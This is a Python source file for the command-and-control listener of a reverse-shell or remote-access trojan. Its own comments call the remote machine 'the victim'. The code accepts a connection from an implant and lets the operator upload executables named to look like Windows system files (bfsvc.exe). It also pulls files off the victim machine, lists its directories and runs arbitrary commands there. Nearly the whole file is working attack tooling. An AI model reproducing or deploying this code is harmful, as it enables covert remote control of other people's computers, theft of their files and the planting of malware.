import os, sys, socket, base64

from optparse import OptionParser
from termcolor import colored

class Server:
    def __init__(self, ip: str, port: int) -> None:
        """
            Initialization function
        """
        try:
            self.downloadDirectory = f'{os.getcwd()}/Downloads'
            self.current_path = os.getcwd()
            self.current_files = os.listdir(os.getcwd())
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.bind((ip, port))
            self.socket.listen(1)
            self.client, self.addr = self.socket.accept()
            print(f'[+] Connection successfully established with machine: {self.addr[0]}:{self.addr[1]}')
        except Exception as exc:
            print('Exception __init__(): ', exc)
    def command_ls(self) -> bool:
        """
            Current files in a directory on my PC
        """
        try:
            result = []
            for file in self.current_files:
                if os.path.isfile(file):
                    result.append(f"\t{file} -- File \n")
                elif os.path.isdir(file):
                    result.append(f"\t{file} -- Directory \n")
                else:
                    continue
            mystr = "".join(result)
            if mystr:
                CURRENT_PATH = f"\n\nCurrent Files:\n{mystr}\nPath: {self.current_path}"
            else:
                CURRENT_PATH = "\n\n\t--- Directory is empty ---"
            print(CURRENT_PATH)
            return True
        except Exception as exc:
            print('Exception command_ls(): ', exc)
    def command_upload(self, command: str) -> bool:
        """
            Command to download a file to the victim's computer
        """
        try:
            filename = command.split()[1]
            with open(filename, 'rb') as file_to_send:
                file = file_to_send.read()
                self.client.send(base64.b64encode(file))
                file_to_send.close()
            self.client.send(b"--- File upload was successful ---")
            result_output = self.client.recv(1024).decode()
            print(result_output)
            return True
        except Exception as exc:
            print('Exception command_upload(): ', exc)
    def command_get(self, command: str, data: str) -> None:
        """
            Command to download a file from the victim's computer
        """
        try:
            filename = command.split()[1]
            json_data = f"{data}"
            while True:
                try:
                    data = self.client.recv(1024).decode("utf-8", "ignore")
                    json_data = json_data + data
                    
                    if "File upload was successful" in data:
                        with open(f'{self.downloadDirectory}/{filename}', 'wb') as file:
                            file.write(base64.b64decode(json_data.replace("--- File upload was successful ---", "")))
                            file.close()
                        print('File Download Successfully')
                        break
                except Exception:
                    continue
        except Exception as exc:
            print('Exception command_get(): ', exc)
    def command_dir(self) -> None:
        """
            Command watch files and directories in the directory
        """
        try:
            json_data = ""
            while True:
                try:
                    data = base64.b64decode(self.client.recv(1024)).decode("utf-8", "ignore")
                    json_data = json_data + data
                    if "--- End ---" in data:
                        print(json_data.replace('--- End ---', ''))
                        break
                except Exception:
                    continue
        except Exception as exc:
            print('Exception command_dir(): ', exc)
    def run(self) -> None:
        """
            Command to start the listener
        """
        try:
            while 1:
                try:
                    command = str(input('>> '))
                    if command.lower() == 'ls':
                        result_command = self.command_ls()
                        if result_command:
                            continue  
                    elif command.lower() == 'upload bfsvc.exe':
                        result_command = self.command_upload(command)
                        if result_command:
                            continue
                    elif command.lower() == 'upload bfsvc1.exe':
                        result_command = self.command_upload(command)
                        if result_command:
                            continue
                    elif command.lower() == 'exit':
                        self.client.send(command.encode())
                        self.socket.close()
                        break
                    elif command.lower() == 'clear':
                        os.system('clear')
                        continue
                    elif 'get' in command:
                        self.client.send(command.encode())
                        result_output = self.client.recv(1024).decode()
                        if 'File not found' in result_output:
                            print('result_output: ', result_output)
                        else:
                            self.command_get(command, result_output)
                    elif 'run' in command:
                        self.client.send(command.encode())
                        result_output = base64.b64decode(self.client.recv(1024)).decode()
                        print('result_output: ', f"\n\n{result_output}")
                    elif command == 'dir':
                        self.client.send(command.encode())
                        self.command_dir()
                    elif not len(command):
                        continue
                    else:
                        self.client.send(command.encode())
                        result_output = base64.b64decode(self.client.recv(1024)).decode()
                        print('result_output: ', result_output)
                        continue
                except KeyboardInterrupt:
                    self.client.send(b'exit')
                    self.client.close()
                    self.socket.close()
                    break
            self.client.close()
            self.socket.close()
        except Exception as exc:
            print('Exception run(): ', exc)


def arg_func():
    """
        Arguments from command string
    """
    try:
        parser = OptionParser()
        parser.add_option("-p", "--port", dest="port", help="Enter listening port")
        options, _ = parser.parse_args()
        if not options.port:
            parser.error(colored("Enter Enter listening port -p or --port", "yellow", attrs=['bold']))
            sys.exit()
        else:
            return options.port
    except Exception:
        print(colored('[-] An error occurred while adding arguments', 'red', attrs=['bold']))


if __name__ == '__main__':
    port = arg_func()
    server = Server("0.0.0.0", int(port))
    server.run()
